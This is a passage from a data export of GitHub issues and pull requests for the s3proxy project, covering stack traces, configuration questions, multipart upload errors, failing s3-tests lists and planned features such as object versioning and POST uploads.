    at org.jclouds.rest.internal.InvokeHttpMethod.apply(InvokeHttpMethod.java:44) ~[s3proxy-original:1.5.0-SNAPSHOT]
    at org.jclouds.rest.internal.DelegatesToInvocationFunction.handle(DelegatesToInvocationFunction.java:156) ~[s3proxy-original:1.5.0-SNAPSHOT]
    at org.jclouds.rest.internal.DelegatesToInvocationFunction.invoke(DelegatesToInvocationFunction.java:123) ~[s3proxy-original:1.5.0-SNAPSHOT]
    at com.sun.proxy.$Proxy51.invoke(Unknown Source) ~[na:na]
    at org.gaul.s3proxy.S3ProxyHandler.doHandleAnonymous(S3ProxyHandler.java:561) ~[s3proxy-original:1.5.0-SNAPSHOT]
    at org.gaul.s3proxy.S3ProxyHandler.doHandle(S3ProxyHandler.java:294) ~[s3proxy-original:1.5.0-SNAPSHOT]
    at org.gaul.s3proxy.S3ProxyHandler.handle(S3ProxyHandler.java:237) ~[s3proxy-original:1.5.0-SNAPSHOT]
    at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97) ~[s3proxy-original:1.5.0-SNAPSHOT]
    at org.eclipse.jetty.server.Server.handle(Server.java:499) ~[s3proxy-original:1.5.0-SNAPSHOT]
    at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:310) ~[s3proxy-original:1.5.0-SNAPSHOT]
    at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:257) [s3proxy-original:1.5.0-SNAPSHOT]
    at org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:540) [s3proxy-original:1.5.0-SNAPSHOT]
    at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635) [s3proxy-original:1.5.0-SNAPSHOT]
    at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555) [s3proxy-original:1.5.0-SNAPSHOT]
    at java.lang.Thread.run(Thread.java:745) [na:1.7.0_79]
```

For kicks I tried it with the openstack-swift provider and got this on startup:

```
Exception in thread ""main"" com.google.common.util.concurrent.UncheckedExecutionException: org.jclouds.http.HttpResponseException: command: POST https://dal05.objectstorage.softlayer.net/auth/v1.0/tokens HTTP/1.1 failed with response: HTTP/1.1 400 Bad Request; content: [<html><h1>Bad Request</h1><p>The server could not comply with the request since it is either malformed or otherwise incorrect.</p></html>]
    at com.google.common.cache.LocalCache$Segment.get(LocalCache.java:2201)
    at com.google.common.cache.LocalCache.get(LocalCache.java:3934)
    at com.google.common.cache.LocalCache.getOrLoad(LocalCache.java:3938)
    at com.google.common.cache.LocalCache$LocalLoadingCache.get(LocalCache.java:4821)
    at com.google.common.cache.LocalCache$LocalLoadingCache.getUnchecked(LocalCache.java:4827)
    at org.jclouds.openstack.keystone.v2_0.config.KeystoneAuthenticationModule$2.get(KeystoneAuthenticationModule.java:252)
    at org.jclouds.openstack.keystone.v2_0.config.KeystoneAuthenticationModule$2.get(KeystoneAuthenticationModule.java:249)
    at org.jclouds.openstack.keystone.v2_0.suppliers.LocationIdToURIFromAccessForTypeAndVersion.get(LocationIdToURIFromAccessForTypeAndVersion.java:94)
    at org.jclouds.openstack.keystone.v2_0.suppliers.LocationIdToURIFromAccessForTypeAndVersion.get(LocationIdToURIFromAccessForTypeAndVersion.java:54)
    at org.jclouds.rest.suppliers.MemoizedRetryOnTimeOutButNotOnAuthorizationExceptionSupplier$SetAndThrowAuthorizationExceptionSupplierBackedLoader.load(MemoizedRetryOnTimeOutButNotOnAuthorizationExceptionSupplier.java:73)
    at org.jclouds.rest.suppliers.MemoizedRetryOnTimeOutButNotOnAuthorizationExceptionSupplier$SetAndThrowAuthorizationExceptionSupplierBackedLoader.load(MemoizedRetryOnTimeOutButNotOnAuthorizationExceptionSupplier.java:57)
    at com.google.common.cache.LocalCache$LoadingValueReference.loadFuture(LocalCache.java:3524)
    at com.google.common.cache.LocalCache$Segment.loadSync(LocalCache.java:2317)
    at com.google.common.cache.LocalCache$Segment.lockedGetOrLoad(LocalCache.java:2280)
    at com.google.common.cache.LocalCache$Segment.get(LocalCache.java:2195)
    at com.google.common.cache.LocalCache.get(LocalCache.java:3934)
    at com.google.common.cache.LocalCache.getOrLoad(LocalCache.java:3938)
    at com.google.common.cache.LocalCache$LocalLoadingCache.get(LocalCache.java:4821)
    at org.jclouds.rest.suppliers.MemoizedRetryOnTimeOutButNotOnAuthorizationExceptionSupplier.get(MemoizedRetryOnTimeOutButNotOnAuthorizationExceptionSupplier.java:119)
    at org.jclouds.suppliers.SupplyKeyMatchingValueOrNull.get(SupplyKeyMatchingValueOrNull.java:52)
    at org.jclouds.rest.suppliers.MemoizedRetryOnTimeOutButNotOnAuthorizationExceptionSupplier$SetAndThrowAuthorizationExceptionSupplierBackedLoader.load(MemoizedRetryOnTimeOutButNotOnAuthorizationExceptionSupplier.java:73)
    at org.jclouds.rest.suppliers.MemoizedRetryOnTimeOutButNotOnAuthorizationExceptionSupplier$SetAndThrowAuthorizationExceptionSupplierBackedLoader.load(MemoizedRetryOnTimeOutButNotOnAuthorizationExceptionSupplier.java:57)
    at com.google.common.cache.LocalCache$LoadingValueReference.loadFuture(LocalCache.java:3524)
    at com.google.common.cache.LocalCache$Segment.loadSync(LocalCache.java:2317)
    at com.google.common.cache.LocalCache$Segment.lockedGetOrLoad(LocalCache.java:2280)
    at com.google.common.cache.LocalCache$Segment.get(LocalCache.java:2195)
    at com.google.common.cache.LocalCache.get(LocalCache.java:3934)
    at com.google.common.cache.LocalCache.getOrLoad(LocalCache.java:3938)
    at com.google.common.cache.LocalCache$LocalLoadingCache.get(LocalCache.java:4821)
    at org.jclouds.rest.suppliers.MemoizedRetryOnTimeOutButNotOnAuthorizationExceptionSupplier.get(MemoizedRetryOnTimeOutButNotOnAuthorizationExceptionSupplier.java:119)
    at org.jclouds.openstack.swift.v1.blobstore.RegionScopedBlobStoreContext.getBlobStore(RegionScopedBlobStoreContext.java:122)
    at org.gaul.s3proxy.Main.main(Main.java:131)
```
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/82/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/82/comments,https://api.github.com/repos/gaul/s3proxy/issues/82/events,https://github.com/gaul/s3proxy/issues/82,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/81,109944102,MDU6SXNzdWUxMDk5NDQxMDI=,81,swift: how to select region? It is always the first entry selected.,1674289,closed,FALSE,NA,NA,4,2015-10-06T06:43:02Z,2019-02-18T10:08:32Z,2015-10-14T20:10:08Z,NONE,NA,"```
main o.j.l.s.i.GetRegionIdMatchingProviderURIOrNull:74 |::] failed to find key for value  https://auth.cloud.ovh.net/v2.0 in {GRA1=https://storage.gra1.cloud.ovh.net/v1/AUTH_xxx, BHS1=https://storage.bhs1.cloud.ovh.net/v1/AUTH_xxx, SBG1=https://storage.sbg1.cloud.ovh.net/v1/AUTH_xxx}; choosing first: GRA1
```

my config:

```
s3proxy.endpoint=http://127.0.0.1:8080
s3proxy.authorization=aws-v2
s3proxy.identity=xxx
s3proxy.credential=xxx
jclouds.provider=openstack-swift
jclouds.endpoint=https://auth.cloud.ovh.net/v2.0
jclouds.api=swift
jclouds.regions=SBG1
jclouds.identity=1xx9:xxx
jclouds.credential=xxx
```
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/81/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/81/comments,https://api.github.com/repos/gaul/s3proxy/issues/81/events,https://github.com/gaul/s3proxy/issues/81,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/80,109882862,MDU6SXNzdWUxMDk4ODI4NjI=,80,"Multipart upload results in ""Form too large"" exception",3627481,closed,FALSE,NA,NA,9,2015-10-05T20:47:45Z,2015-12-02T14:26:22Z,2015-12-02T14:26:22Z,NONE,NA,"I tried performing a multipart upload via the Java AWS SDK but jetty threw an exception:

```
20:06:58.167 [qtp792782299-17 - /s3proxy-596354326/stuff?uploadId=EXAMPLEJZ6e0YupT2h66iePQCc9IEbYbDUy4RTpMeoSMLPRp8Z5o1u8feSRonpvnWsKKG35tI2LB9VDPiCgTy.Gq2VxQLYjrue4Nq.NBdqI-dc5b1fe8-31ea-4902-9de1-51187d9c718e&partNumber=5001] WARN  org.eclipse.jetty.server.HttpChannel - /s3proxy-596354326/stuff?uploadId=EXAMPLEJZ6e0YupT2h66iePQCc9IEbYbDUy4RTpMeoSMLPRp8Z5o1u8feSRonpvnWsKKG35tI2LB9VDPiCgTy.Gq2VxQLYjrue4Nq.NBdqI-dc5b1fe8-31ea-4902-9de1-51187d9c718e&partNumber=5001
java.lang.IllegalStateException: Form too large: 10485768 > 200000
    at org.eclipse.jetty.server.Request.extractFormParameters(Request.java:364)
```

The part is about 10 MB. Am I doing something wrong? The setup for the proxy was copied directly from `S3AwsSdkTest.java` and the client was set up as follows:

```
AmazonS3Client client = new AmazonS3Client(awsCreds);
        client.setEndpoint(s3Endpoint.toString());
        client.setS3ClientOptions(new S3ClientOptions().withPathStyleAccess(true));
```

I didn't include the signer override part because I didn't know what algorithm to put in there.

As far as I understand the ""Form too large"" error indicates that jetty is configured this way. Do I have to configure it myself? If so, how? Moreover, why? It seems surprising that the setup wouldn't accept large packets by default, to the extent that I'm convinced I've done something else wrong.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/80/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/80/comments,https://api.github.com/repos/gaul/s3proxy/issues/80/events,https://github.com/gaul/s3proxy/issues/80,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/79,108747448,MDU6SXNzdWUxMDg3NDc0NDg=,79,Bucket in hostname on filestore provider,193093,closed,FALSE,NA,NA,2,2015-09-28T21:09:32Z,2015-09-29T10:29:45Z,2015-09-29T10:29:45Z,NONE,NA,"According to the S3 api docs the bucket name should be part of the hostname of the URL ( http://docs.aws.amazon.com/AmazonS3/latest/API/RESTBucketGET.html#RESTBucketGET-responses-examples ) In other words the bucket name is part of the domain and not part of the path.

So I added a couple of /etc/hostfile entries to test this behaviour of s3proxy with a filestore provider:

```
127.0.0.1       s3
127.0.0.1       bucket1.s3
```

I used a pretty simple config file:

```
s3proxy.authorization=none
s3proxy.endpoint=http://s3:8080
jclouds.provider=filesystem
jclouds.identity=identity
jclouds.credential=credential
jclouds.filesystem.basedir=/tmp/s3
```

I created the `/tmp/s3` and `/tmp/s3/bucket1` directories.

Then used curl to test the config.  I expected `curl http://s3:8080/` to give me a list of buckets and `curl http://bucket1.s3:8080/` to give me a list of objects in bucket1.  However both these give me a list of buckets.  (It works if I do `curl -v http://s3:8080/bucket1/`)

Is this expected behaviour?
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/79/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/79/comments,https://api.github.com/repos/gaul/s3proxy/issues/79/events,https://github.com/gaul/s3proxy/issues/79,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/78,102568242,MDExOlB1bGxSZXF1ZXN0NDMxMTA2MTk=,78,Terminate on s3proxy start failure,1644146,closed,FALSE,NA,NA,1,2015-08-22T21:31:09Z,2015-08-24T02:08:40Z,2015-08-24T01:41:05Z,CONTRIBUTOR,NA,"E.g. when bind(2) fails.
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/78/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/78/comments,https://api.github.com/repos/gaul/s3proxy/issues/78/events,https://github.com/gaul/s3proxy/pull/78,https://api.github.com/repos/gaul/s3proxy/pulls/78
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/77,99701517,MDU6SXNzdWU5OTcwMTUxNw==,77,Conditional get,848247,closed,FALSE,NA,NA,0,2015-08-07T18:17:08Z,2015-11-20T02:39:20Z,2015-11-20T02:39:20Z,OWNER,NA,"S3Proxy should support conditional gets with:
- If-Modified-Since
- If-Unmodified-Since
- If-Match
- If-None-Match

The underlying jclouds already has support for this but s3-tests lacks test coverage ceph/s3-tests#72.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/77/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/77/comments,https://api.github.com/repos/gaul/s3proxy/issues/77/events,https://github.com/gaul/s3proxy/issues/77,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/76,98271248,MDU6SXNzdWU5ODI3MTI0OA==,76,Native multipart copy,848247,open,FALSE,NA,NA,1,2015-07-30T21:40:41Z,2017-04-24T19:24:54Z,NA,OWNER,NA,"Presently S3Proxy emulates multipart copy with a range `getBlob` request followed by `uploadPart`.  Instead jclouds should offer native support.  Note that this will need the Azure part size workaround as the existing multipart upload code.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/76/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/76/comments,https://api.github.com/repos/gaul/s3proxy/issues/76/events,https://github.com/gaul/s3proxy/issues/76,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/75,97109265,MDU6SXNzdWU5NzEwOTI2NQ==,75,Requests with unreadable characters in headers,848247,open,FALSE,NA,NA,0,2015-07-24T18:25:35Z,2015-08-13T19:08:13Z,NA,OWNER,NA,"Many s3-tests fail due to unreadable characters in headers:

```
ERROR: s3tests.functional.test_headers.test_object_create_bad_expect_unreadable
ERROR: s3tests.functional.test_headers.test_object_create_bad_ua_unreadable
ERROR: s3tests.functional.test_headers.test_bucket_create_bad_expect_unreadable
ERROR: s3tests.functional.test_headers.test_bucket_create_bad_ua_unreadable
ERROR: s3tests.functional.test_s3.test_object_set_get_metadata_empty_to_unreadable_prefix
ERROR: s3tests.functional.test_s3.test_object_set_get_metadata_empty_to_unreadable_suffix
ERROR: s3tests.functional.test_s3.test_object_set_get_metadata_empty_to_unreadable_infix
ERROR: s3tests.functional.test_s3.test_object_set_get_metadata_overwrite_to_unreadable_prefix
ERROR: s3tests.functional.test_s3.test_object_set_get_metadata_overwrite_to_unreadable_suffix
ERROR: s3tests.functional.test_s3.test_object_set_get_metadata_overwrite_to_unreadable_infix
FAIL: s3tests.functional.test_headers.test_object_create_bad_md5_unreadable
FAIL: s3tests.functional.test_headers.test_object_create_bad_contentlength_unreadable
FAIL: s3tests.functional.test_headers.test_object_create_bad_contenttype_unreadable
FAIL: s3tests.functional.test_headers.test_object_create_bad_authorization_unreadable
FAIL: s3tests.functional.test_headers.test_object_create_bad_date_unreadable
FAIL: s3tests.functional.test_headers.test_bucket_create_bad_contentlength_unreadable
FAIL: s3tests.functional.test_headers.test_bucket_create_bad_authorization_unreadable
FAIL: s3tests.functional.test_headers.test_bucket_create_bad_date_unreadable
```

Jetty immediately returns a 400 error for these requests which prevents S3Proxy from handling them:

```
W 07-24 11:08:02.144 S3Proxy-14 o.e.jetty.http.HttpParser:1719 |::] Illegal character 0x4 in state=HEADER_IN_VALUE for buffer HeapByteBuffer@3d6811d8[p=279,l=410,c=16384,r=131]={PUT /gaul-33o3yv7...-meta-meta1: h\x04<<<w\r\nAuthorization:...-57-generic\r\n\r\n>>>\r\n\r\n-generic\r\n\r\n\n...\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00}
W 07-24 11:08:02.144 S3Proxy-14 o.e.jetty.http.HttpParser:1344 |::] badMessage: 400 Illegal character 0x4 for HttpChannelOverHttp@4b0947c6{r=1,c=false,a=IDLE,uri=-}
```
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/75/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/75/comments,https://api.github.com/repos/gaul/s3proxy/issues/75/events,https://github.com/gaul/s3proxy/issues/75,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/74,97106895,MDU6SXNzdWU5NzEwNjg5NQ==,74,Object versioning,848247,open,FALSE,NA,NA,0,2015-07-24T18:13:10Z,2015-07-24T18:13:10Z,NA,OWNER,NA,"S3Proxy does not currently support object versioning, triggering many s3-tests failures:

```
ERROR: s3tests.functional.test_s3.test_versioning_bucket_create_suspend
ERROR: s3tests.functional.test_s3.test_versioning_obj_create_read_remove
ERROR: s3tests.functional.test_s3.test_versioning_obj_create_read_remove_head
ERROR: s3tests.functional.test_s3.test_versioning_obj_suspend_versions
ERROR: s3tests.functional.test_s3.test_versioning_obj_suspend_versions_simple
ERROR: s3tests.functional.test_s3.test_versioning_obj_create_versions_remove_all
ERROR: s3tests.functional.test_s3.test_versioning_obj_create_overwrite_multipart
ERROR: s3tests.functional.test_s3.test_versioning_obj_list_marker
ERROR: s3tests.functional.test_s3.test_versioning_copy_obj_version
ERROR: s3tests.functional.test_s3.test_versioning_multi_object_delete
ERROR: s3tests.functional.test_s3.test_versioning_multi_object_delete_with_marker
ERROR: s3tests.functional.test_s3.test_versioning_multi_object_delete_with_marker_create
ERROR: s3tests.functional.test_s3.test_versioned_object_acl
ERROR: s3tests.functional.test_s3.test_versioned_concurrent_object_create_concurrent_remove
ERROR: s3tests.functional.test_s3.test_versioned_concurrent_object_create_and_remove
```

Implementing this requires upstream jclouds work tracked by [JCLOUDS-895](https://issues.apache.org/jira/browse/JCLOUDS-895).
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/74/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/74/comments,https://api.github.com/repos/gaul/s3proxy/issues/74/events,https://github.com/gaul/s3proxy/issues/74,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/73,97106224,MDU6SXNzdWU5NzEwNjIyNA==,73,POST uploads,848247,open,FALSE,NA,NA,19,2015-07-24T18:09:58Z,2019-10-31T00:22:55Z,NA,OWNER,NA,"S3Proxy does not currently support POST uploads, triggering many s3-tests failures:

```
ERROR: s3tests.functional.test_s3.test_post_object_anonymous_request
ERROR: s3tests.functional.test_s3.test_post_object_authenticated_request_bad_access_key
ERROR: s3tests.functional.test_s3.test_post_object_set_success_code
ERROR: s3tests.functional.test_s3.test_post_object_set_invalid_success_code
FAIL: s3tests.functional.test_s3.test_post_object_authenticated_request
FAIL: s3tests.functional.test_s3.test_post_object_upload_larger_than_chunk
FAIL: s3tests.functional.test_s3.test_post_object_set_key_from_filename
FAIL: s3tests.functional.test_s3.test_post_object_ignored_header
FAIL: s3tests.functional.test_s3.test_post_object_case_insensitive_condition_fields
FAIL: s3tests.functional.test_s3.test_post_object_escaped_field_values
FAIL: s3tests.functional.test_s3.test_post_object_success_redirect_action
FAIL: s3tests.functional.test_s3.test_post_object_invalid_date_format
FAIL: s3tests.functional.test_s3.test_post_object_no_key_specified
FAIL: s3tests.functional.test_s3.test_post_object_missing_signature
FAIL: s3tests.functional.test_s3.test_post_object_user_specified_header
FAIL: s3tests.functional.test_s3.test_post_object_condition_is_case_sensitive
FAIL: s3tests.functional.test_s3.test_post_object_expires_is_case_sensitive
FAIL: s3tests.functional.test_s3.test_post_object_missing_expires_condition
FAIL: s3tests.functional.test_s3.test_post_object_missing_conditions_list
FAIL: s3tests.functional.test_s3.test_post_object_upload_size_limit_exceeded
FAIL: s3tests.functional.test_s3.test_post_object_missing_content_length_argument
FAIL: s3tests.functional.test_s3.test_post_object_invalid_content_length_argument
FAIL: s3tests.functional.test_s3.test_post_object_upload_size_below_minimum
```
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/73/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/73/comments,https://api.github.com/repos/gaul/s3proxy/issues/73/events,https://github.com/gaul/s3proxy/issues/73,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/72,95740595,MDExOlB1bGxSZXF1ZXN0NDAyNjk2OTg=,72,Partially emulate arbitrary markers with Azure,848247,closed,FALSE,NA,NA,1,2015-07-17T20:44:14Z,2015-07-28T12:16:04Z,2015-07-28T12:15:58Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/72/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/72/comments,https://api.github.com/repos/gaul/s3proxy/issues/72/events,https://github.com/gaul/s3proxy/pull/72,https://api.github.com/repos/gaul/s3proxy/pulls/72
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/71,95035335,MDExOlB1bGxSZXF1ZXN0Mzk5NTk5MzE=,71,Enable delimiter support.,703870,closed,FALSE,NA,NA,0,2015-07-14T20:40:37Z,2015-07-15T23:20:17Z,2015-07-14T20:46:45Z,CONTRIBUTOR,NA,"Enables support for the delimiter option.

Amends a recursive test to expect that the delimiter is included in
the common prefix name.
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/71/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/71/comments,https://api.github.com/repos/gaul/s3proxy/issues/71/events,https://github.com/gaul/s3proxy/pull/71,https://api.github.com/repos/gaul/s3proxy/pulls/71
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/70,94194725,MDU6SXNzdWU5NDE5NDcyNQ==,70,Signature dosen't match,8454433,closed,FALSE,NA,NA,0,2015-07-10T02:04:00Z,2015-07-10T02:13:29Z,2015-07-10T02:12:57Z,NONE,NA,"Hello,

I'm getting signature issues, even though I've set the s3proxy.credential and s3proxy.identity to be the same as in my local ~/.aws/credentials file. Am I misreading the documentation, should this work?

EDIT: Problem with my set up.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/70/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/70/comments,https://api.github.com/repos/gaul/s3proxy/issues/70/events,https://github.com/gaul/s3proxy/issues/70,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/69,93640627,MDExOlB1bGxSZXF1ZXN0Mzk0MjIzNTA=,69,Allow anonymous access via bucket and object ACLs,848247,closed,FALSE,NA,NA,2,2015-07-07T22:08:26Z,2015-07-13T21:02:54Z,2015-07-13T21:02:49Z,OWNER,NA,"Fixes #44.
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/69/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/69/comments,https://api.github.com/repos/gaul/s3proxy/issues/69/events,https://github.com/gaul/s3proxy/pull/69,https://api.github.com/repos/gaul/s3proxy/pulls/69
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/68,92200746,MDU6SXNzdWU5MjIwMDc0Ng==,68,S3Proxy incorrectly demangles _$folder_ blob names,848247,open,FALSE,NA,NA,0,2015-06-30T21:12:15Z,2015-06-30T21:12:15Z,NA,OWNER,NA,"jclouds demangles blob names to emulate directories which are not useful to S3Proxy.  @kahing suggests working around this with:

``` java
try {
    Field f = BlobStoreConstants.class.getDeclaredField(""DIRECTORY_SUFFIXES"");
    f.setAccessible(true);
    Field modifiersField = Field.class.getDeclaredField(""modifiers"");
    modifiersField.setAccessible(true);
    modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
    f.set(null, ImmutableList.of(""/""));
} catch (NoSuchFieldException | IllegalAccessException e) {
    throw propagate(e);
}
```
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/68/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/68/comments,https://api.github.com/repos/gaul/s3proxy/issues/68/events,https://github.com/gaul/s3proxy/issues/68,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/67,90783111,MDExOlB1bGxSZXF1ZXN0Mzg0ODkxMjI=,67,jclouds integration test,1772540,closed,FALSE,NA,NA,2,2015-06-24T21:22:20Z,2016-03-05T01:15:09Z,2015-06-25T21:09:56Z,COLLABORATOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/67/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/67/comments,https://api.github.com/repos/gaul/s3proxy/issues/67/events,https://github.com/gaul/s3proxy/pull/67,https://api.github.com/repos/gaul/s3proxy/pulls/67
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/66,90193126,MDU6SXNzdWU5MDE5MzEyNg==,66,Consider adding Accept-Ranges header,848247,closed,FALSE,NA,NA,0,2015-06-22T19:46:44Z,2016-01-16T06:44:42Z,2016-01-16T06:44:42Z,OWNER,NA,"RFC specifies that:

```
      The Accept-Ranges response-header field allows the server to
      indicate its acceptance of range requests for a resource:

          Accept-Ranges     = ""Accept-Ranges"" "":"" acceptable-ranges
          acceptable-ranges = 1#range-unit | ""none""

      Origin servers that accept byte-range requests MAY send

          Accept-Ranges: bytes

      but are not required to do so.
```

http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.5

Follow-on to #63.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/66/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/66/comments,https://api.github.com/repos/gaul/s3proxy/issues/66/events,https://github.com/gaul/s3proxy/issues/66,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/65,89872620,MDU6SXNzdWU4OTg3MjYyMA==,65,Add mechanism to model eventual consistency,848247,closed,FALSE,NA,NA,0,2015-06-21T06:35:32Z,2016-03-02T01:16:34Z,2016-03-02T01:16:34Z,OWNER,NA,"S3Proxy offers an opportunity to implement an eventual consistency middleware.  This would allow a more deterministic and reliable way to uncover applications erroneously relying on strong consistency.  This middleware could use two backend blobstores, writing the the first one and reading from the second, periodically syncing updates from the former to the latter.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/65/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/65/comments,https://api.github.com/repos/gaul/s3proxy/issues/65/events,https://github.com/gaul/s3proxy/issues/65,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/64,89061403,MDExOlB1bGxSZXF1ZXN0Mzc5MTg5ODA=,64,Include Content-Range header in range requests,848247,closed,FALSE,NA,NA,4,2015-06-17T16:16:29Z,2015-06-25T21:12:08Z,2015-06-17T19:39:17Z,OWNER,NA,"Fixes #63.
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/64/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/64/comments,https://api.github.com/repos/gaul/s3proxy/issues/64/events,https://github.com/gaul/s3proxy/pull/64,https://api.github.com/repos/gaul/s3proxy/pulls/64
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/63,88728540,MDU6SXNzdWU4ODcyODU0MA==,63,Exception with partial content (206),559192,closed,FALSE,NA,NA,13,2015-06-16T13:29:57Z,2015-06-20T10:29:25Z,2015-06-17T19:39:16Z,NONE,NA,"I try to serve .mp4 files, so I put an nginx in front of s3proxy to set the right `content-type` (video/mp4). Once I do this I can write the following url in the browser: http://localhost/6015_2018_2035.h264.cutted.mp4

If I don't set the `content-type` the video is downloaded instead of being reproduced in the browser (chrome in my case).

The problem is that when chrome tries to reproduce the video it sends two connections. The second one responds with a 206 (partial content) and with the right header (byte ranges) but at the end I get the following exception:

```
15:26:13.819 [qtp2032647583-21 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.WriteFlusher - update WriteFlusher@18916c5b{WRITING}:IDLE-->WRITING
15:26:13.819 [qtp2032647583-21 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.ChannelEndPoint - flushed 32768 SelectChannelEndPoint@4465ed37{/127.0.0.1:48839<->9090,Open,in,out,-,W,1/30000,HttpConnection}{io=0,kio=0,kro=1}
15:26:13.819 [qtp2032647583-21 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.WriteFlusher - update WriteFlusher@18916c5b{IDLE}:WRITING-->IDLE
15:26:13.819 [qtp2032647583-21 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG o.e.jetty.server.HttpConnection - org.eclipse.jetty.server.HttpConnection$SendCallback@56cd6ef[PROCESSING][i=null,cb=Blocker@69df07da{null}] generate: DONE (null,[p=32768,l=32768,c=32768,r=0],false)@COMMITTED
15:26:13.819 [qtp2032647583-21 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG o.e.jetty.server.HttpConnection - org.eclipse.jetty.server.HttpConnection$SendCallback@56cd6ef[PROCESSING][i=null,cb=Blocker@69df07da{null}] generate: FLUSH (null,[p=0,l=32768,c=32768,r=32768],false)@COMMITTED
15:26:13.819 [qtp2032647583-21 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.WriteFlusher - write: WriteFlusher@18916c5b{IDLE} [HeapByteBuffer@3fb28ad9[p=0,l=32768,c=32768,r=32768]={<<<\x1d\x88\x11x6=\xA4\\QR\xF7Z\xD5\xFa\xB2\x90\x94...\x8b}\x1b@\xD7\x8bF\xAb\xCb\x12\xEd\x85\x06t\x0f>>>}]
15:26:13.819 [qtp2032647583-21 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.WriteFlusher - update WriteFlusher@18916c5b{WRITING}:IDLE-->WRITING
